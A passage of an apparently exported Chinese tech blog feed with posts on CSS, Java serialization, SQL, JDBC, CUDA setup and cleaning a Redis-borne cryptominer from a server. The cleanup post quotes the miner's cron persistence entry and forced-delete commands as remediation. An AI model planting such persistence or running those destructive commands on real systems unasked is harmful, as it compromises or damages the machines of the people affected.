class="attribute">text-overflow</span>: ellipsis; <span class="comment">/*文字超出部分以省略号显示*/</span></span><br><span class="line">-webkit-line-clamp: <span class="number">2</span>; <span class="comment">/*这里就是设置超出几行隐藏*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">5</span><span class="selector-class">.div</span>的子标签在<span class="selector-tag">div</span>中居中对齐（前提没有其他布局模式生效）</span><br><span class="line"><span class="attribute">text-align</span>:center</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>.全局居中</span><br><span class="line">position: fixed;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translateX</span>(-<span class="number">50%</span>) <span class="built_in">translateY</span>(-<span class="number">50%</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">7</span>.列表滚动显示</span><br><span class="line"><span class="attribute">overflow</span>:scroll; <span class="comment">/*内容会被修剪，但是浏览器会显示滚动条以便查看其余的内容。或者overflow:auto;*/</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">overflow</span>:visible; <span class="comment">/*默认值。内容不会被修剪，会呈现在元素框之外。*/</span></span><br><span class="line"><span class="attribute">overflow</span>:hidden; <span class="comment">/*内容会被修剪，并且其余内容是不可见的。*/</span></span><br><span class="line"><span class="attribute">overflow</span>:scroll; <span class="comment">/*内容会被修剪，但是浏览器会显示滚动条以便查看其余的内容。*/</span></span><br><span class="line"><span class="attribute">overflow</span>:auto; <span class="comment">/*如果内容被修剪，则浏览器会显示滚动条以便查看其余的内容。*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">8</span>.模态框</span><br><span class="line"><span class="selector-class">.mask</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100vw</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100vh</span>;</span><br><span class="line">  <span class="attribute">opacity</span>: .<span class="number">5</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#f2f2f2</span>;</span><br><span class="line">  <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">  <span class="attribute">background-size</span>: cover;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.mapAndInfo</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateX</span>(-<span class="number">50%</span>) <span class="built_in">translateY</span>(-<span class="number">50%</span>);</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">2</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">1300px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">750px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">20px</span> <span class="number">2px</span> <span class="number">#BEBCBC</span>FF;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">9</span>.操作数组</span><br><span class="line">push(item1) 将一个、多个加到末尾，返回新长度。修改原有数组</span><br><span class="line">splice(start, deleteCount <span class="selector-attr">[,item1,…]</span>)	 start 后面deleteCount个元素被删除（含第 start 位）。若只删除了一个，则返回只包含一个元素的数组。若没有删除元素，则返回空数组。此方法修改原数组。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>序列化和反序列化</title>
    <url>/2021/11/01/%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><span id="more"></span>

<p><strong>序列化：</strong>把Java对象转换为字节序列的过程</p>
<p><strong>反序列化：</strong>把自己序列恢复为Java对象的过程</p>
<h3 id="使用原因"><a href="#使用原因" class="headerlink" title="使用原因"></a>使用原因</h3><ol>
<li><strong>便于存储：</strong>可以吧对象的字节序列永久保存到硬盘上（如果放内存中，则会消失）</li>
<li><strong>便于传输：</strong>在网络上传送对象的字节序列</li>
<li><strong>附加：</strong>将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中重建对象</li>
</ol>
<h3 id="好处"><a href="#好处" class="headerlink" title="好处"></a>好处</h3><p>由于整个过程都是在Java虚拟机（JVM）上运行的，独立于电脑的操作系统，所以，<strong>在一个平台上序列化的对象可以在另一个完全不同的平台上反序列化该对象，在内存中重建对象</strong></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>核心作用就是对象状态的保存和重建。（整个过程的核心点：<strong>字节流中的所保存的对象状态及描述信息</strong>）</p>
<h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><p><strong>条件：</strong>被序列化的对象的类必须实现接口 java.io.Serializable</p>
<h3 id="JDK中序列化和反序列化的API"><a href="#JDK中序列化和反序列化的API" class="headerlink" title="JDK中序列化和反序列化的API"></a>JDK中序列化和反序列化的API</h3><p><strong>①java.io.ObjectInputStream：对象输入流。</strong></p>
<p>该类的readObject()方法从输入流中读取字节序列，然后将字节序列反序列化为一个对象并返回。</p>
<p><strong>②java.io.ObjectOutputStream：对象输出流。</strong></p>
<p>该类的writeObject(Object obj)方法将将传入的obj对象进行序列化，把得到的字节序列写入到目标输出流中进行输出。</p>
<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>主要有两步骤：</p>
<ol>
<li><strong>创建一个对象输出流</strong>，它可以包装一个其他类型的目标输出流，如文件输出流</li>
<li><strong>通过ObjectOutputStream对象输入流的writeObject()方法写对象</strong></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Pet pet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person();</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">&quot;text.txt&quot;</span>);       <span class="comment">//对象序列化保存的位置</span></span><br><span class="line">        FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(fileOutputStream);   <span class="comment">//需要使用ObjectOutputStream对象</span></span><br><span class="line">        objectOutputStream.writeObject(person);         <span class="comment">//使用writeObject()方法将对象序列化</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意！！！：如对象中有非基本类型属性，则该属性的类也需要实现Serializable接口</strong></p>
<p><strong>注意！！！：如对象中有非基本类型属性，则该属性的类也需要实现Serializable接口</strong></p>
<p><strong>注意！！！：如对象中有非基本类型属性，则该属性的类也需要实现Serializable接口</strong></p>
<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>主要有两步骤：</p>
<ol>
<li><strong>创建一个对象输入流</strong>，它可以包装一个其他类型的源输入流，如文件输入流</li>
<li><strong>通过ObjectOutputStream对象输入流的readObject()方法读取对象</strong></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Pet pet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">null</span>;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">&quot;text.txt&quot;</span>);       <span class="comment">//被反序列化的对象的存储位置</span></span><br><span class="line">        FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(fileInputStream);   <span class="comment">//需要用到ObjectInputStream对象</span></span><br><span class="line">        person = (Person) objectInputStream.readObject();       <span class="comment">//反序列化对象的字节码</span></span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>序列化和反序列化</tag>
        <tag>IO流</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库常用sql语句</title>
    <url>/2021/10/24/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B8%B8%E7%94%A8sql%E8%AF%AD%E5%8F%A5/</url>
    <content><![CDATA[<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><span id="more"></span>

<h3 id="常用SQL语句"><a href="#常用SQL语句" class="headerlink" title="常用SQL语句"></a>常用SQL语句</h3><p>MySQL中常用的SQL语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 1 ALTER TABLE：添加，修改，删除表的列，约束等表的定义。     </span><br><span class="line"> 2 查看列：desc 表名;  </span><br><span class="line"> 3 修改表名：alter table t_book rename to bbb;  </span><br><span class="line"> 4 添加列：alter table 表名 add column 列名 varchar(30);  </span><br><span class="line"> 5 删除列：alter table 表名 drop column 列名;  </span><br><span class="line"> 6 修改列名MySQL： alter table bbb change nnnnn hh int;  </span><br><span class="line"> 7 修改列名SQLServer：exec sp_rename&#39;t_student.name&#39;,&#39;nn&#39;,&#39;column&#39;;  </span><br><span class="line"> 8 修改列名Oracle：lter table bbb rename column nnnnn to hh int;  </span><br><span class="line"> 9 修改列属性：alter table t_book modify name varchar(22);  </span><br><span class="line">10 sp_rename：SQLServer 内置的存储过程，用与修改表的定义。 </span><br><span class="line"> </span><br><span class="line">   添加字段  </span><br><span class="line"> 1 alter table user add COLUMN new1 VARCHAR(20) DEFAULT NULL; &#x2F;&#x2F;增加一个字段，默认为空  </span><br><span class="line"> 2 alter table user add COLUMN new2 VARCHAR(20) NOT NULL;  &#x2F;&#x2F;增加一个字段，默认不能为空</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MySQL 查看约束，添加约束，删除约束 添加列，修改列，删除列  </span><br><span class="line"> 1 查看表的字段信息：desc 表名;  </span><br><span class="line"> 2 查看表的所有信息：show create table 表名;  </span><br><span class="line"> 3 添加主键约束：alter table 表名 add constraint 主键 （形如：PK_表名） primary key 表名(主键字段);  </span><br><span class="line"> 4 添加外键约束：alter table 从表 add constraint 外键（形如：FK_从表_主表） foreign key 从表(外键字段) references 主表(主键字段);  </span><br><span class="line"> 5 删除主键约束：alter table 表名 drop primary key;  </span><br><span class="line"> 6 删除外键约束：alter table 表名 drop foreign key 外键（区分大小写）;  </span><br><span class="line"> 7 修改表名：alter table t_book rename to bbb;  </span><br><span class="line"> 8 添加列：alter table 表名 add column 列名 varchar(30);  </span><br><span class="line"> 9 删除列：alter table 表名 drop column 列名;  </span><br><span class="line">10 修改列名MySQL： alter table bbb change nnnnn hh int;  </span><br><span class="line">11 修改列名SQLServer：exec sp_rename&#39;t_student.name&#39;,&#39;nn&#39;,&#39;column&#39;;  </span><br><span class="line">12 修改列名Oracle：alter table bbb rename column nnnnn to hh int;  </span><br><span class="line">13 修改列属性：alter table t_book modify name varchar(22);  </span><br><span class="line">14 sp_rename：SQLServer 内置的存储过程，用与修改表的定义。  </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mysql在表的某一位置增加一列的命令</span><br><span class="line"> 如果想在一个已经建好的表中添加一列，可以用诸如：</span><br><span class="line"> alter table t1 add column addr varchar(20) not null;</span><br><span class="line"></span><br><span class="line"> 这条语句会向已有的表t1中加入一列addr，这一列在表的最后一列位置。如果我们希望添加在指定的一列，可以用：</span><br><span class="line"> alter table t1 add column addr varchar(20) not null after user1;</span><br><span class="line"></span><br><span class="line"> 注意，上面这个命令的意思是说添加addr列到user1这一列后面。如果想添加到第一列的话，可以用：</span><br><span class="line"> alter table t1 add column addr varchar(20) not null first;</span><br></pre></td></tr></table></figure>

<h3 id="语句执行顺序"><a href="#语句执行顺序" class="headerlink" title="语句执行顺序"></a>语句执行顺序</h3><p><img src="https://i.loli.net/2021/10/24/2oOPsryxkp1XGlZ.png" alt="image-20211024153315160"></p>
]]></content>
      <tags>
        <tag>数据库</tag>
        <tag>sql语句</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库驱动、jdbc、mybatis、数据源四者的关系</title>
    <url>/2022/04/26/%E6%95%B0%E6%8D%AE%E5%BA%93%E9%A9%B1%E5%8A%A8%E3%80%81jdbc%E3%80%81mybatis%E3%80%81%E6%95%B0%E6%8D%AE%E6%BA%90%E5%9B%9B%E8%80%85%E7%9A%84%E5%85%B3%E7%B3%BB/</url>
    <content><![CDATA[<h2 id="四者关系，一图见之"><a href="#四者关系，一图见之" class="headerlink" title="四者关系，一图见之"></a>四者关系，一图见之</h2><span id="more"></span>

<p><img src="https://s2.loli.net/2022/04/26/Due6T3QvZ2z5WOI.png" alt="未命名绘图.drawio"></p>
<p><strong>略加解释：</strong></p>
<p>1、连接不同的数据库需要使用不同的数据库驱动（数据库驱动）</p>
<p>2、jdbc本质上就是提供了一组规范的api、并且通过数据库驱动，连接的数据库（JDBC、数据库驱动）</p>
<p>3.1、mybatis可以视为jdbc封装起来的一个组件，拥有很多jdbc不具备的优点（JDBC、mybatis）<br>3.2、Mybatis能集成第三方的数据源组件，自身也提供了数据源的实现（mybatis、数据源）</p>
<p>4.1、数据源也是通过数据库驱动，连接到的数据库（数据源、数据驱动）<br>4.2、数据源本质上就是为了解决资源浪费的问题</p>
]]></content>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>最大公约数——欧几里得辗转相除法</title>
    <url>/2023/03/06/%E6%9C%80%E5%A4%A7%E5%85%AC%E7%BA%A6%E6%95%B0%E2%80%94%E2%80%94%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E8%BE%97%E8%BD%AC%E7%9B%B8%E9%99%A4%E6%B3%95/</url>
    <content><![CDATA[<h2 id="欧几里得——辗转相除法"><a href="#欧几里得——辗转相除法" class="headerlink" title="欧几里得——辗转相除法"></a>欧几里得——辗转相除法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (b != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> tem = a % b;</span><br><span class="line">    a = b;</span><br><span class="line">    b = tem;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;a和b的最大公约数为：&quot;</span> + a);</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>服务器一直100%负载、CPU100%使用率</title>
    <url>/2023/01/09/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%80%E7%9B%B4100-%E8%B4%9F%E8%BD%BD%E3%80%81CPU100-%E4%BD%BF%E7%94%A8%E7%8E%87/</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><span id="more"></span>

<blockquote>
<p>远程连接服务器，执行命令速度明显慢到离谱。通过宝塔，发现<strong>负载状态和CPU使用率都跑到了100%</strong></p>
</blockquote>
<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><h3 id="挖矿病毒"><a href="#挖矿病毒" class="headerlink" title="挖矿病毒"></a>挖矿病毒</h3><p>经过查找分析，是一个叫做<code>zzh</code>的<strong>挖矿病毒</strong>导致的。</p>
<h3 id="Redis未授权"><a href="#Redis未授权" class="headerlink" title="Redis未授权"></a>Redis未授权</h3><p>这个病毒是哪里来的呢？</p>
<p>后来查找分析，知道这个病毒是因为Redis一开始没有设置登录密码导致的。具体漏洞网上是这么说的：</p>
<p><a href="https://imgse.com/i/pSZypfe"><img src="https://s1.ax1x.com/2023/01/09/pSZypfe.png" alt="pSZypfe.png"></a></p>
<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><ol>
<li><p>首先想到的是通过<code>ps -ef</code>或者<code>top</code>查找资源占用率异常的进程（结果失败，因为这两条命令查不出来）</p>
<blockquote>
<p>注：top虽然也查不出来，但是可以发现us占到了90+%，这明显不正常</p>
</blockquote>
</li>
<li><p>使用<code>htop</code>命令查找，如果没有这条命令，需要安装一下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install epel-release</span><br><span class="line">yum -y install htop</span><br></pre></td></tr></table></figure></li>
<li><p>首先发现前两行跑满了，变成了红色。然后下面的进程列表也可以看到有几个<code>zzh</code>的进程占满了资源<br><a href="https://imgse.com/i/pSZyCSH"><img src="https://s1.ax1x.com/2023/01/09/pSZyCSH.png" alt="pSZyCSH.png"></a></p>
</li>
<li><p>使用<code>kill -9 PID号</code>把这几个进程杀死</p>
</li>
<li><p>执行<code>ps -ef | grep newinit</code>，将查到的几个进程也用上一步的命令杀死 </p>
</li>
<li><p>再执行这几条命令（<strong>清除病毒</strong>）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/bin</span><br><span class="line">//这一段为了修改chatrr命令的权限</span><br><span class="line">cp chattr chattr.new</span><br><span class="line">chmod a+x chattr.new</span><br><span class="line">chattr.new -i chattr</span><br><span class="line">rm -f chattr.new</span><br><span class="line">chmod a+x chattr</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line">//这一段为了删除zzh文件</span><br><span class="line">chattr -ia zzh	//少了这一步，删除时会提示没有权限</span><br><span class="line">rm -rf zzh </span><br><span class="line">rm -rf zzhs</span><br><span class="line"></span><br><span class="line">//这一段为了删除newinit.sh文件</span><br><span class="line">chattr -ia newinit.sh	//少了这一步，删除时会提示没有权限</span><br><span class="line">rm -rf newinit.sh</span><br></pre></td></tr></table></figure></li>
<li><p>再使用<code>htop</code>命令查看有没有<code>zzh</code>进程了，如果有的话，再使用<code>kill -9 PID号</code>杀死进程</p>
</li>
<li><p>同样对第5步中<code>newinit.sh</code>进程也再检查一次，操作同第7步</p>
</li>
</ol>
<h2 id="遗留问题"><a href="#遗留问题" class="headerlink" title="遗留问题"></a>遗留问题</h2><p>经过上述步骤，通过宝塔可以发现已经没有恶意程序占用资源了</p>
<p>但是出于想要彻底清除病毒的目的，我又通过<code>find / -name zzh</code>命令发现还存在<code>/etc/cron.d/zzh</code>文件，也就是说定时任务中还有这个文件，通过<code>vim</code>编辑，发现里面也就一行命令<code>*/50 * * * * sh /etc/newinit.sh &gt;/dev/null 2&gt;&amp;1</code>。（这个文件我想删除，但是怎么都删除失败了）</p>
<p>以及通过<code>crontab -e</code>查看当前在执行的定时任务程序，发现也是上述那条命令<code>*/50 * * * * sh /etc/newinit.sh &gt;/dev/null 2&gt;&amp;1</code>，输入<code>dd</code>命令，用<code>wq!</code>也保存不了。这个命令内容其实存储在<code>/var/spool/cron/用户名</code>文件中，但是这个文件也不能通过<code>chmod</code>修改读写权限</p>
<p>所以，虽然解决了负载和CPU资源占用问题，但是这个病毒搞的定时任务感觉并没有彻底清除。</p>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>机器学习</title>
    <url>/2023/11/13/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="机器学习定义"><a href="#机器学习定义" class="headerlink" title="机器学习定义"></a>机器学习定义</h2><span id="more"></span>

<p>机器学习是一种在没有明确编程的情况下让计算机学习的方法，通过大量的数据观察和学习，使计算机系统能够自动提高性能。</p>
<p>监督学习使最常用的机器学习类型，通过已知的标签数据进行训练，可以用于预测和分类等应用场景。</p>
<p>无监督学习则通过未标记的数据进行训练，常用于聚类和降维等应用。</p>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h4 id="监督学习"><a href="#监督学习" class="headerlink" title="监督学习"></a>监督学习</h4><ul>
<li>回归（Regression）：输入数据带标签，输出是数字</li>
<li>分类（Classification）：输入数据带标签，输出不是数字，而是类别</li>
</ul>
<blockquote>
<p>分类的输出类别只能是有限的、离散的数量；而回归是可以有无数种可能的数字的情况的。</p>
</blockquote>
<p>无监督学习</p>
<ul>
<li>聚类（Clustering）：输入数据不带标签，输出是类别</li>
<li>异常检测（Anomaly Detection）：输入数据不带标签</li>
<li>降维（Dimensionality Reduction）：输入数据不带标签</li>
</ul>
]]></content>
      <tags>
        <tag>MachineLearning</tag>
      </tags>
  </entry>
  <entry>
    <title>深度学习（1）</title>
    <url>/2024/04/09/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%EF%BC%881%EF%BC%89/</url>
    <content><![CDATA[<h2 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h2><span id="more"></span>

<p>安装顺序：</p>
<ol>
<li>检查硬件驱动支持的cuda版本<code>nvidia-smi</code></li>
<li>安装cuda（一种通用的并行计算平台和编程模型，由 NVIDIA 开发）（可跳过）<ul>
<li><p>（一般可以直接从第三步开始，因为cudatoolkit的安装包中包含了 CUDA 驱动程序和其他与 CUDA 相关的组件）</p>
</li>
<li><p>一般而言，cuda是<strong>向下兼容</strong>的，但是<strong>不绝对</strong>(见下述常见错误2)</p>
</li>
</ul>
</li>
<li>安装cudatoolkit<ul>
<li>它包含了 CUDA 编译器、CUDA 运行时库、CUDA 驱动程序等，为开发和运行 CUDA 程序提供基础。CUDA Toolkit 提供了 GPU 计算的基础设施和接口，并包含了与硬件交互的驱动程序。</li>
</ul>
</li>
<li>安装cudnn（ NVIDIA 提供的一个针对深度学习的 GPU 加速库）</li>
<li>安装pytorch（和cuda有对应关系，pytorch发布时会说明cuda的版本要求，二者版本要是配）</li>
</ol>
<h4 id="方式一：本地安装"><a href="#方式一：本地安装" class="headerlink" title="方式一：本地安装"></a>方式一：本地安装</h4><p>在windows中，cuda或者cudatoolkit安装时候是exe文件安装，cudnn是压缩包或者exe可执行程序</p>
<p>按照版本对应关系安装完后，其中cuda是需要在系统环境变量中添加变量的</p>
<h4 id="方式二：在Anaconda的创建的虚拟环境中安装"><a href="#方式二：在Anaconda的创建的虚拟环境中安装" class="headerlink" title="方式二：在Anaconda的创建的虚拟环境中安装"></a>方式二：在Anaconda的创建的虚拟环境中安装</h4><p>安装上述库的时候可以指定版本</p>
<h3 id="常见错误"><a href="#常见错误" class="headerlink" title="常见错误"></a>常见错误</h3><h4 id="错误1"><a href="#错误1" class="headerlink" title="错误1"></a>错误1</h4><p>报错如下：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Solving environment: failed with initial frozen solve. Retrying with flexible solve.</span><br></pre></td></tr></table></figure>

<p><strong>解释</strong>:</p>
<p>这通常是指一个软件包管理器(如pip、conda等)在尝试安装某个软件包时遇到了问题，并且在第一次尝试使用’frozen solve”方法时失败了。</p>
<p>“Frozen solve”是一种求解器的方法，它会尝试使用已知的软件包版本和其依赖项版本来解决软件包之间的冲突。但是，如果冻结的版本之间存在冲突，求解器就无法找到解决方案，就会导致失败。<br>因此，软件包管理器会自动切换到l”flexible sove”方法，这种方法会更加灵活，可以在软件包的版本之间进行权衡，以找到一个可行的解决方案。这可能需要更长的时间和计算资源，但通常可以解决冲突并成功安装所需的软件包。</p>
<p><strong>解决:</strong></p>
<p>不用管，继续等待即可</p>
<h4 id="错误2"><a href="#错误2" class="headerlink" title="错误2"></a>错误2</h4><p>报错如下:</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">UserWarning: </span></span><br><span class="line"><span class="function"><span class="title">NVIDIA</span> <span class="title">GeForce</span> <span class="title">RTX</span> 3060 <span class="title">Laptop</span> <span class="title">GPU</span> <span class="title">with</span> <span class="title">CUDA</span> <span class="title">capability</span> <span class="title">sm_86</span> <span class="title">is</span> <span class="title">not</span> <span class="title">compatible</span> <span class="title">with</span> <span class="title">the</span> <span class="title">current</span> <span class="title">PyTorch</span> <span class="title">installation</span>.</span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">current</span> <span class="title">PyTorch</span> <span class="title">install</span> <span class="title">supports</span> <span class="title">CUDA</span> <span class="title">capabilities</span> <span class="title">sm_37</span> <span class="title">sm_50</span> <span class="title">sm_60</span> <span class="title">sm_61</span> <span class="title">sm_70</span> <span class="title">sm_75</span> <span class="title">compute_37</span>.</span></span><br><span class="line"><span class="function"><span class="title">If</span> <span class="title">you</span> <span class="title">want</span> <span class="title">to</span> <span class="title">use</span> <span class="title">the</span> <span class="title">NVIDIA</span> <span class="title">GeForce</span> <span class="title">RTX</span> 3060 <span class="title">Laptop</span> <span class="title">GPU</span> <span class="title">GPU</span> <span class="title">with</span> <span class="title">PyTorch</span>, <span class="title">please</span> <span class="title">check</span> <span class="title">the</span> <span class="title">instructions</span> <span class="title">at</span> <span class="title">https</span>://<span class="title">pytorch.org</span>/<span class="title">get</span>-<span class="title">started</span>/<span class="title">locally</span>/</span></span><br></pre></td></tr></table></figure>

<p><strong>解释:</strong></p>
<p>具有CUDA功能的笔记本GPU sm_86与当前PyTorch不兼容”</p>
<p>三种可能原因</p>
<ol>
<li>显卡与CUDA版本不对应</li>
<li>CUDA版本与pytorch版本不对应</li>
<li>三者都不对应</li>
</ol>
<p><strong>解决:</strong></p>
<p>首先牢记:<strong>GPU&gt;CUDA&gt;Pytorch</strong>(就是说显卡越好，需要的CUDA版本要越高。</p>
<p>换种说法就是算力越强，CUDA版本。比如3060计算能力为8.6，但是CUDA10.×的计算能力最大为7.5，则就会出现GPU和CUDA不匹配的问题。</p>
<blockquote>
<p>GPU算力查询：<a href="https://developer.nvidia.com/cuda-gpus#collapseOne">CUDA GPUs - Compute Capability | NVIDIA Developer</a></p>
<p>CUDA算力支持查询：<a href="https://en.wikipedia.org/wiki/CUDA#GPUs_supported">CUDA - Wikipedia</a></p>
</blockquote>
<h4 id="错误3"><a href="#错误3" class="headerlink" title="错误3"></a>错误3</h4><p>报错如下：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">raise RuntimeError(&#x27;Attempting to deserialize object on a CUDA &#x27;</span><br><span class="line"><span class="function">RuntimeError: <span class="title">Attempting</span> <span class="title">to</span> <span class="title">deserialize</span> <span class="title">object</span> <span class="title">on</span> <span class="title">a</span> <span class="title">CUDA</span> <span class="title">device</span> <span class="title">but</span> <span class="title">torch.cuda.is_available</span>() <span class="title">is</span> <span class="title">False</span>. <span class="title">If</span> <span class="title">you</span> <span class="title">are</span> <span class="title">running</span> <span class="title">on</span> <span class="title">a</span> <span class="title">CPU</span>-<span class="title">only</span> <span class="title">machine</span>, <span class="title">please</span> <span class="title">use</span> <span class="title">torch.load</span> <span class="title">with</span> <span class="title">map_location</span>=<span class="title">torch.device</span>(&#x27;<span class="title">cpu</span>&#x27;) <span class="title">to</span> <span class="title">map</span> <span class="title">your</span> <span class="title">storages</span> <span class="title">to</span> <span class="title">the</span> <span class="title">CPU</span>.</span></span><br></pre></td></tr></table></figure>

<p><strong>解释：</strong></p>
<p>安装的pytorch版本默认安装的是cpu版本，所以用不了gpu</p>
<p><strong>解决</strong></p>
<h5 id="方法1（推荐，通过轮子安装pytorch）"><a href="#方法1（推荐，通过轮子安装pytorch）" class="headerlink" title="方法1（推荐，通过轮子安装pytorch）"></a>方法1（推荐，通过轮子安装pytorch）</h5><ol>
<li>在安装torch之前按照下法安装torch</li>
<li>去<a href="https://download.pytorch.org/whl/torch_stable.html">download.pytorch.org/whl/torch_stable.html</a>下载gpu版本的对应版本的轮子</li>
